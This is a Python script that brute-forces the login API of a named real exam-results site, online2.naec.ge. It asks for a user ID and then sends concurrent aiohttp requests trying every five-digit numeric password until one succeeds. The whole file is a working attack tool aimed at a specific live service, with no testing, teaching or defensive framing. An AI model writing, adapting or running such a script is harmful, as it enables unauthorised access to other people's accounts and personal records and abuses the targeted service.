import aiohttp
import asyncio
import time
import sys
import os

from multiprocessing import cpu_count


cracked = False
url = 'https://online2.naec.ge/uee-res/api/login'


def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


async def brute(uid, pwds):
    global cracked
    async with aiohttp.ClientSession() as session:
        for password in pwds:
            password = str('%05d' % password)

            if cracked:
                break

            sys.stdout.write(f'\r[*] Trying with this password: {password}')
            sys.stdout.flush()

            async with session.post(url, json = {'user': uid, 'password': password}) as response:
                response = await response.text()

                if 'err' not in response:
                    cracked = True
                    return password

        return False


async def getResults(uid, pwd_list):
    results = await asyncio.gather(*(brute(uid, pwd) for pwd in pwd_list))
    return results


if __name__ == '__main__':
    threads = cpu_count() * 2
    pwds = [i for i in range(100000)]
    each = chunks(pwds, (len(pwds) // threads))

    os.system('cls' if os.name == 'nt' else 'clear')
    uid = str(input('[!] Please enter user id: '))
    start_time = int(time.time())
    
    print(f'[!] Starting bruteforce with {threads} threads')
    print(f'[+] successfully generated passwords!')

    for result in asyncio.run(getResults(uid, each)):
        if result:
            print(f'\n[*] Password successfully cracked: {result}')
            print(f'[!] Shutting down... (time: {int(int(time.time()) - start_time)})')
